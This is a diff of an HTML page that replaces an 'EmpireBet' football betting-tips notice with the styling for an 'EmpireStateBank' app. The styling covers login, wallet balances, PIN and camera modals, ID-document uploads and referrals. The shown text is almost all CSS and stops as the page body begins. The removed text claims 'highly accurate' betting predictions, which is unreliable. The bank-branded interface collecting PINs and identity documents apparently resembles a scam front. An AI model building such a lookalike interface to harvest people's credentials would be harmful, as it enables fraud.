@@ -1,138 +1,3310 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=1024, initial-scale=1.0">
-    <title>EmpireBet Information</title>
-    <style>
-        html, body {
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            min-height: 100vh;
-            min-width: 100vw;
-            background:
-                linear-gradient(120deg, rgba(30,40,60,0.90) 75%, rgba(0,0,0,.94) 100%),
-                url('-5890865169557472356_109.jpg') center center/cover no-repeat fixed;
-            font-family: 'Segoe UI', 'Montserrat', Arial, sans-serif;
-            color: #f4f7fa;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .main-content {
-            background: rgba(28, 38, 54, 0.97);
-            border-radius: 18px;
-            box-shadow: 0 8px 40px 0 rgba(20, 80, 180, 0.22);
-            width: 760px;
-            padding: 2.7rem 2.8rem 2.4rem 2.8rem;
-            display: flex;
-            flex-direction: column;
-            gap: 1.2rem;
-        }
-        .company-header {
-            font-size: 2.1rem;
-            font-weight: 800;
-            color: #25d6cf;
-            letter-spacing: 3.5px;
-            text-align: center;
-            margin-bottom: 0.4rem;
-            text-shadow: 0 2px 12px rgba(37,214,207,0.09);
-        }
-        h1 {
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: #ffcb52;
-            margin: 0.3rem 0 1.1rem 0;
-            text-align: center;
-            letter-spacing: .6px;
-        }
-        .info-section {
-            font-size: 1.09rem;
-            color: #eafcff;
-            background: rgba(36, 45, 65, 0.82);
-            border-radius: 11px;
-            padding: 1.1rem 1.7rem 1.1rem 1.7rem;
-            margin-bottom: 0.3rem;
-            line-height: 1.7;
-        }
-        .notice-section {
-            margin-top: 0.8rem;
-            background: linear-gradient(90deg, #1e293b 85%, #232d3e 100%);
-            border-left: 7px solid #25d6cf;
-            border-radius: 10px;
-            padding: 1.08rem 1.35rem 1.08rem 1.6rem;
-            font-size: 1.05rem;
-            color: #b3faff;
-        }
-        .notice-title {
-            font-weight: bold;
-            color: #25d6cf;
-            font-size: 1.15em;
-            display: block;
-            margin-bottom: 0.4em;
-            letter-spacing: 1.2px;
-        }
-        .site-link {
-            display: block;
-            margin: 2.1rem auto 0 auto;
-            font-size: 1.13rem;
-            font-weight: 700;
-            color: #fff;
-            background: linear-gradient(90deg, #17c4ec 0%, #25d6cf 100%);
-            padding: 0.95em 2.8em;
-            border-radius: 8px;
-            text-decoration: none;
-            text-align: center;
-            box-shadow: 0 2px 16px rgba(23, 196, 236, 0.16);
-            transition: background 0.2s, transform 0.12s;
-            width: fit-content;
-        }
-        .site-link:hover, .site-link:focus {
-            background: linear-gradient(90deg, #25d6cf 0%, #17c4ec 100%);
-            color: #fffae0;
-            transform: scale(1.03);
-        }
-        @media (max-width: 900px) {
-            .main-content {
-                width: 97vw;
-                padding: 1.2rem 0.3rem 1.1rem 0.3rem;
-            }
-            .company-header {
-                font-size: 1.27rem;
-            }
-            h1 {
-                font-size: 1rem;
-            }
-            .info-section, .notice-section {
-                font-size: 0.98rem;
-                padding: 1rem 0.9rem 1rem 1.1rem;
-            }
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>EmpireStateBank</title>
+
+  <style>
+    :root {
+      --green: #00b875;
+      --dark-green: #008f5c;
+      --gold: #d4af37;
+      --navy: #121d2b;
+      --cream: #fffdf8;
+      --text: #292929;
+      --muted: #777;
+      --teal: #1a6f7d;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #f6f5f2;
+      color: var(--text);
+      font-family: Arial, sans-serif;
+    }
+
+    button,
+    input {
+      font: inherit;
+    }
+
+    button {
+      cursor: pointer;
+    }
+
+    .page {
+      min-height: 100vh;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    /* Loading Overlay */
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top-color: #d4af37;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Cover page */
+    #coverPage {
+      display: flex;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 24px;
+      color: #fff;
+      background: #09b877;
+    }
+
+    #coverPage img {
+      width: 170px;
+      height: 170px;
+      object-fit: contain;
+      margin-bottom: 22px;
+    }
+
+    #coverPage h1 {
+      color: #17104c;
+      font-size: clamp(27px, 7vw, 42px);
+      margin-bottom: 15px;
+    }
+
+    #coverPage p {
+      color: #17104c;
+      font-size: 17px;
+      font-weight: 600;
+    }
+
+    .loader {
+      width: 42px;
+      height: 42px;
+      border: 4px solid rgba(255,255,255,.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: rotate 1s linear infinite;
+      margin-top: 35px;
+    }
+
+    @keyframes rotate {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Login */
+    #loginPage {
+      min-height: 100vh;
+      padding: 30px 20px 100px;
+      background: #eef0ef;
+      position: relative;
+    }
+
+    .close-mark {
+      font-size: 54px;
+      color: #4b4b4b;
+      line-height: 1;
+      margin-bottom: 25px;
+    }
+
+    .login-card {
+      width: 100%;
+      max-width: 640px;
+      margin: auto;
+      padding: 38px 40px;
+      border-radius: 14px;
+      background: var(--cream);
+    }
+
+    .login-card h2 {
+      color: #064c61;
+      margin-bottom: 45px;
+      font-size: 27px;
+    }
+
+    .field {
+      margin-bottom: 28px;
+    }
+
+    .field label {
+      display: block;
+      color: #064c61;
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+
+    .field input,
+    .field select {
+      width: 100%;
+      border: 0;
+      border-radius: 13px;
+      padding: 19px;
+      background: #f0f0ee;
+      font-size: 18px;
+      outline: none;
+    }
+
+    .primary-btn {
+      width: 100%;
+      border: 0;
+      border-radius: 12px;
+      padding: 18px;
+      color: #fff;
+      background: #087dce;
+      font-weight: 700;
+      font-size: 19px;
+      transition: transform 0.2s;
+    }
+
+    .primary-btn:hover {
+      transform: scale(1.02);
+    }
+
+    .login-links {
+      max-width: 640px;
+      margin: 35px auto 0;
+      text-align: center;
+      font-size: 18px;
+    }
+
+    .login-links a {
+      color: #111;
+      text-decoration: none;
+    }
+
+    .login-links hr {
+      margin: 20px 0 28px;
+      border: 0;
+      border-top: 2px solid #ccc;
+    }
+
+    .login-links strong {
+      cursor: pointer;
+    }
+
+    /* Dashboard */
+    #dashboardPage {
+      max-width: 720px;
+      margin: auto;
+      padding-bottom: 90px;
+    }
+
+    .dashboard-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 25px 28px;
+    }
+
+    .user-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .avatar-wrap {
+      position: relative;
+      width: 62px;
+      height: 62px;
+    }
+
+    .avatar-wrap img {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 3px solid var(--gold);
+    }
+
+    .tier {
+      position: absolute;
+      right: -4px;
+      bottom: -4px;
+      width: 27px;
+      height: 27px;
+      display: grid;
+      place-items: center;
+      border: 2px solid #fff;
+      border-radius: 50%;
+      color: #624300;
+      background: #f5c95b;
+      font-weight: 700;
+    }
+
+    .hello {
+      font-size: 21px;
+      font-weight: 700;
+    }
+
+    .header-icons {
+      display: flex;
+      gap: 14px;
+      font-size: 22px;
+      position: relative;
+    }
+
+    .header-icons button {
+      background: none;
+      border: none;
+      color: var(--text);
+      font-size: 22px;
+      cursor: pointer;
+      padding: 0;
+      position: relative;
+    }
+
+    .notification-badge {
+      position: absolute;
+      top: -5px;
+      right: -5px;
+      background: #e74c3c;
+      color: #fff;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .dashboard-content {
+      padding: 0 28px;
+    }
+
+    /* Wallet Section Header */
+    .wallet-section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+      padding: 0 5px;
+    }
+
+    .wallet-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    .wallet-dots {
+      font-size: 18px;
+      color: #999;
+    }
+
+    .wallet-indicators {
+      display: flex;
+      gap: 6px;
+      justify-content: center;
+      margin-top: 10px;
+    }
+
+    .indicator {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #ccc;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .indicator.active {
+      background: var(--green);
+    }
+
+    /* Wallet Cards Slider */
+    .wallet-slider-wrapper {
+      position: relative;
+      overflow: hidden;
+      margin-bottom: 18px;
+    }
+
+    .wallet-slider {
+      display: flex;
+      transition: transform 0.3s ease;
+      cursor: grab;
+    }
+
+    .wallet-slider.grabbing {
+      cursor: grabbing;
+    }
+
+    .wallet-card {
+      flex: 0 0 100%;
+      padding: 25px;
+      border-radius: 22px;
+      color: #fff;
+      background: var(--teal);
+      min-height: 200px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .wallet-card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .wallet-card-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .verve-label {
+      background: #e74c3c;
+      color: #fff;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: bold;
+    }
+
+    .wallet-card-number {
+      font-size: 12px;
+      color: #ccc;
+    }
+
+    .wallet-card-middle {
+      margin: 15px 0;
+    }
+
+    .wallet-label {
+      font-size: 12px;
+      color: #ccc;
+      margin-bottom: 8px;
+    }
+
+    .wallet-balance {
+      font-size: 31px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .balance-hidden {
+      letter-spacing: 3px;
+    }
+
+    .eye-icon-btn {
+      font-size: 18px;
+      background: none;
+      border: none;
+      color: #fff;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .eye-icon-btn:hover {
+      transform: scale(1.2);
+    }
+
+    .wallet-card-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .wallet-action-btn {
+      flex: 1;
+      padding: 12px 16px;
+      border: 0;
+      border-radius: 8px;
+      color: var(--teal);
+      background: #fff;
+      font-weight: 700;
+      font-size: 13px;
+      transition: transform 0.2s;
+    }
+
+    .wallet-action-btn:hover {
+      transform: scale(1.05);
+    }
+
+    .wallet-action-icon {
+      width: 40px;
+      height: 40px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .withdraw-label {
+      font-size: 11px;
+      color: #ccc;
+      margin-top: 8px;
+    }
+
+    .incoming {
+      margin: 18px 0;
+      padding: 22px;
+      border-radius: 20px;
+      background: var(--navy);
+      color: #fff;
+    }
+
+    .incoming h2 {
+      margin-bottom: 16px;
+    }
+
+    .progress-track {
+      height: 22px;
+      overflow: hidden;
+      border-radius: 15px;
+      background: #26364a;
+    }
+
+    .progress-value {
+      height: 100%;
+      width: 64%;
+      border-radius: inherit;
+      background: repeating-linear-gradient(
+        45deg,
+        #f4ce5e 0,
+        #f4ce5e 15px,
+        #eabe45 15px,
+        #eabe45 30px
+      );
+      animation: progress-shine 1.2s linear infinite;
+    }
+
+    @keyframes progress-shine {
+      to { background-position: 30px 0; }
+    }
+
+    .incoming-meta {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 12px;
+      color: #b9c1cc;
+      font-size: 16px;
+    }
+
+    .actions,
+    .services {
+      display: grid;
+      gap: 14px;
+      margin-top: 18px;
+    }
+
+    .actions {
+      grid-template-columns: repeat(3, 1fr);
+    }
+
+    .services {
+      grid-template-columns: repeat(4, 1fr);
+    }
+
+    .tile {
+      border: 0;
+      border-radius: 18px;
+      padding: 18px 8px;
+      background: var(--cream);
+      color: var(--text);
+      box-shadow: 0 3px 12px rgba(0,0,0,.06);
+      text-align: center;
+      transition: transform 0.2s;
+    }
+
+    .tile:hover {
+      transform: translateY(-3px);
+    }
+
+    .tile-icon {
+      width: 48px;
+      height: 48px;
+      display: grid;
+      place-items: center;
+      margin: auto auto 10px;
+      border-radius: 50%;
+      color: var(--green);
+      background: #e0f5e8;
+      font-size: 22px;
+    }
+
+    .tile span:last-child {
+      font-size: 13px;
+    }
+
+    .bottom-nav {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      display: flex;
+      justify-content: space-around;
+      padding: 12px 8px;
+      background: #fff;
+      border-top: 1px solid #eee;
+    }
+
+    .nav-item {
+      border: 0;
+      background: transparent;
+      color: #999;
+      text-align: center;
+    }
+
+    .nav-item.active {
+      color: var(--green);
+    }
+
+    .nav-item div {
+      font-size: 22px;
+    }
+
+    /* Modal */
+    .modal {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      display: none;
+      align-items: flex-end;
+      justify-content: center;
+      padding: 15px;
+      background: rgba(0,0,0,.55);
+      overflow-y: auto;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-card {
+      width: 100%;
+      max-width: 620px;
+      max-height: 92vh;
+      overflow-y: auto;
+      padding: 25px;
+      border-radius: 22px 22px 0 0;
+      background: #fff;
+    }
+
+    .modal-back {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      font-size: 24px;
+      cursor: pointer;
+      color: var(--text);
+    }
+
+    .modal-card h2 {
+      margin-bottom: 22px;
+      color: var(--text);
+      font-size: 20px;
+    }
+
+    .modal-card .field {
+      margin-bottom: 16px;
+    }
+
+    .secondary-btn {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      border: 0;
+      border-radius: 9px;
+      background: #eee;
+    }
+
+    /* Convert Modal Specific */
+    .convert-header {
+      background: var(--teal);
+      color: #fff;
+      margin: -25px -25px 25px -25px;
+      padding: 20px 25px;
+      border-radius: 22px 22px 0 0;
+    }
+
+    .convert-amount-display {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 15px;
+      background: #f5f5f5;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 24px;
+      font-weight: bold;
+      color: var(--text);
+    }
+
+    .edit-icon {
+      cursor: pointer;
+      font-size: 18px;
+      color: #999;
+    }
+
+    .field-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+    }
+
+    .card-display {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px;
+      background: #f5f5f5;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    /* Alert Modal */
+    .alert-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 11;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.7);
+    }
+
+    .alert-modal.active {
+      display: flex;
+    }
+
+    .alert-box {
+      width: 100%;
+      max-width: 320px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 25px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .alert-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      margin-bottom: 15px;
+    }
+
+    .alert-message {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .alert-btn {
+      width: 100%;
+      padding: 12px;
+      background: var(--green);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .alert-btn:hover {
+      background: var(--dark-green);
+    }
+
+    /* PIN Modal */
+    .pin-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 12;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.7);
+    }
+
+    .pin-modal.active {
+      display: flex;
+    }
+
+    .pin-box {
+      width: 100%;
+      max-width: 320px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 25px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .pin-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .pin-input-field {
+      margin-bottom: 20px;
+    }
+
+    .pin-input-field label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .pin-input-field input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+      letter-spacing: 2px;
+    }
+
+    .pin-buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .pin-btn {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .pin-confirm {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .pin-confirm:hover {
+      background: var(--dark-green);
+    }
+
+    .pin-cancel {
+      background: #eee;
+      color: var(--text);
+    }
+
+    .pin-cancel:hover {
+      background: #ddd;
+    }
+
+    /* TV Channel Modal */
+    .tv-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      background: rgba(0,0,0,.55);
+    }
+
+    .tv-modal.active {
+      display: flex;
+    }
+
+    .tv-box {
+      width: 100%;
+      max-width: 320px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 25px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .tv-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      margin-bottom: 20px;
+    }
+
+    .tv-buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .tv-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .tv-channel-btn {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .tv-channel-btn:hover {
+      background: var(--dark-green);
+    }
+
+    .tv-close-btn {
+      background: #eee;
+      color: var(--text);
+    }
+
+    .tv-close-btn:hover {
+      background: #ddd;
+    }
+
+    /* Referral Program Page */
+    .referral-page {
+      display: none;
+      min-height: 100vh;
+      background: #f6f5f2;
+      padding: 20px;
+      padding-bottom: 90px;
+    }
+
+    .referral-page.active {
+      display: block;
+    }
+
+    .referral-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 25px;
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      position: relative;
+    }
+
+    .referral-close {
+      position: absolute;
+      left: 0;
+      width: 40px;
+      height: 40px;
+      background: #1a1a1a;
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .referral-title {
+      margin-left: 50px;
+      flex: 1;
+      text-align: left;
+    }
+
+    .referral-content {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .referral-banner {
+      background: #e8f5e9;
+      border-radius: 12px;
+      padding: 30px 20px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .referral-banner-icon {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    .referral-section {
+      background: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+
+    .referral-section-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 15px;
+    }
+
+    .referral-code {
+      background: #f5f5f5;
+      border-radius: 8px;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .referral-code-text {
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .copy-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 8px;
+      color: #666;
+    }
+
+    .copy-btn:hover {
+      color: var(--green);
+    }
+
+    .referral-link {
+      background: #f5f5f5;
+      border-radius: 8px;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      word-break: break-all;
+    }
+
+    .referral-link-text {
+      font-size: 13px;
+      color: #666;
+      flex: 1;
+    }
+
+    .link-buttons {
+      display: flex;
+      gap: 8px;
+    }
+
+    .link-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 8px;
+      color: #666;
+    }
+
+    .link-btn:hover {
+      color: var(--green);
+    }
+
+    .share-btn {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .share-btn:hover {
+      background: var(--dark-green);
+    }
+
+    .how-it-works {
+      background: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+
+    .how-it-works-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 15px;
+    }
+
+    .how-it-works-list {
+      list-style: disc;
+      padding-left: 20px;
+    }
+
+    .how-it-works-list li {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 10px;
+      line-height: 1.5;
+    }
+
+    /* Proof Page Styles */
+    .proof-page {
+      display: none;
+      min-height: 100vh;
+      background: #f6f5f2;
+      padding: 20px;
+      padding-bottom: 90px;
+    }
+
+    .proof-page.active {
+      display: block;
+    }
+
+    .proof-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 25px;
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+    }
+
+    .proof-header span {
+      cursor: pointer;
+      font-size: 24px;
+    }
+
+    .proof-content {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .proof-alert {
+      background: #e0f5e8;
+      border-left: 4px solid var(--green);
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .proof-alert strong {
+      color: var(--green);
+    }
+
+    .proof-form {
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 3px 12px rgba(0,0,0,.08);
+    }
+
+    .form-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .form-label .required {
+      color: #e74c3c;
+      margin-right: 3px;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 16px;
+    }
+
+    .form-select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 14px;
+      margin-bottom: 16px;
+      background: #fff;
+    }
+
+    .document-section {
+      margin-bottom: 20px;
+      padding: 15px;
+      background: #f9f9f9;
+      border-radius: 8px;
+    }
+
+    .radio-group {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 16px;
+    }
+
+    .radio-option {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+    }
+
+    .radio-option input[type="radio"] {
+      cursor: pointer;
+      width: 18px;
+      height: 18px;
+    }
+
+    .upload-area {
+      border: 2px dashed #ddd;
+      border-radius: 8px;
+      padding: 30px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: border-color 0.2s, background-color 0.2s;
+      margin-bottom: 12px;
+    }
+
+    .upload-area:hover {
+      border-color: var(--green);
+      background-color: #f0fdf4;
+    }
+
+    .upload-area-icon {
+      font-size: 40px;
+      margin-bottom: 10px;
+    }
+
+    .upload-area-text {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 5px;
+    }
+
+    .upload-area-hint {
+      font-size: 12px;
+      color: #999;
+    }
+
+    .sample-link {
+      display: inline-block;
+      color: var(--green);
+      text-decoration: underline;
+      font-size: 12px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .file-name {
+      font-size: 12px;
+      color: var(--green);
+      margin-top: 8px;
+      word-break: break-all;
+    }
+
+    .get-account-btn {
+      width: 100%;
+      padding: 12px;
+      background: var(--green);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 16px;
+      display: none;
+    }
+
+    .get-account-btn.show {
+      display: block;
+    }
+
+    .proof-submit-btn {
+      width: 100%;
+      padding: 14px;
+      background: var(--green);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 20px;
+    }
+
+    .proof-submit-btn:hover {
+      background: var(--dark-green);
+    }
+
+    .footer-info {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .footer-info img {
+      height: 30px;
+      margin: 10px 3px 0 3px;
+      vertical-align: middle;
+    }
+
+    /* Profile Page */
+    .profile-page {
+      display: none;
+      min-height: 100vh;
+      background: #f6f5f2;
+      padding: 20px;
+      padding-bottom: 90px;
+    }
+
+    .profile-page.active {
+      display: block;
+    }
+
+    .profile-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+    }
+
+    .profile-back {
+      cursor: pointer;
+      font-size: 24px;
+    }
+
+    .profile-card {
+      max-width: 720px;
+      margin: 10px auto;
+      background: #fff;
+      border-radius: 14px;
+      padding: 22px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.04);
+    }
+
+    .profile-top {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+
+    .profile-top img {
+      width: 96px;
+      height: 96px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 4px solid #f3f3f3;
+    }
+
+    .profile-name {
+      font-weight: 700;
+      font-size: 18px;
+      letter-spacing: 0.5px;
+    }
+
+    .profile-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 10px 0;
+      color: #333;
+    }
+
+    .profile-label {
+      color: #777;
+    }
+
+    .upgrade-btn {
+      padding: 8px 12px;
+      background: #ffe7ea;
+      color: #d23b57;
+      border-radius: 18px;
+      border: none;
+      font-weight: 700;
+      cursor: pointer;
+      margin-left: 12px;
+    }
+
+    .profile-fields {
+      background: #fbfbfb;
+      border-radius: 12px;
+      padding: 16px;
+      margin-top: 14px;
+    }
+
+    .field-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 0;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .field-item:last-child {
+      border-bottom: none;
+    }
+
+    .field-name {
+      color: #666;
+    }
+
+    .field-value {
+      color: #222;
+      font-weight: 600;
+    }
+
+    /* Camera Modal */
+    .camera-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 1000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.7);
+    }
+
+    .camera-modal.active {
+      display: flex;
+    }
+
+    .camera-box {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 16px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .camera-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--text);
+      margin-bottom: 15px;
+    }
+
+    .camera-video {
+      width: 100%;
+      border-radius: 12px;
+      margin-bottom: 15px;
+      background: #000;
+      max-height: 300px;
+      object-fit: cover;
+    }
+
+    .camera-canvas {
+      display: none;
+    }
+
+    .camera-buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .camera-btn {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+      font-size: 14px;
+    }
+
+    .camera-capture {
+      background: var(--green);
+      color: #fff;
+    }
+
+    .camera-capture:hover {
+      background: var(--dark-green);
+    }
+
+    .camera-close {
+      background: #eee;
+      color: var(--text);
+    }
+
+    .camera-close:hover {
+      background: #ddd;
+    }
+
+    .captured-image {
+      width: 100%;
+      margin-top: 15px;
+      border-radius: 8px;
+      display: none;
+      max-width: 200px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    @media (max-width: 480px) {
+      .login-card {
+        padding: 28px 20px;
+      }
+
+      .dashboard-header,
+      .dashboard-content {
+        padding-left: 18px;
+        padding-right: 18px;
+      }
+
+      .services {
+        gap: 8px;
+      }
+
+      .tile {
+        padding-left: 4px;
+        padding-right: 4px;
+      }
+    }
+  </style>
 </head>
+
 <body>
-    <div class="main-content">
-        <div class="company-header">EmpireStateBank</div>
-        <h1>EmpireBet Program Updates</h1>
-        <div class="info-section">
-            All EmpireBet programs are ready and optimized for your success. Our Rollover Football Betting Tips offer highly accurate predictions, putting you at a real advantage. To get started, simply log in with your PIN, or subscribe if you do not have an account yet. <br>
-            Subscriptions open on the 1st day of every month.
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Cover page -->
+  <section id="coverPage" class="page">
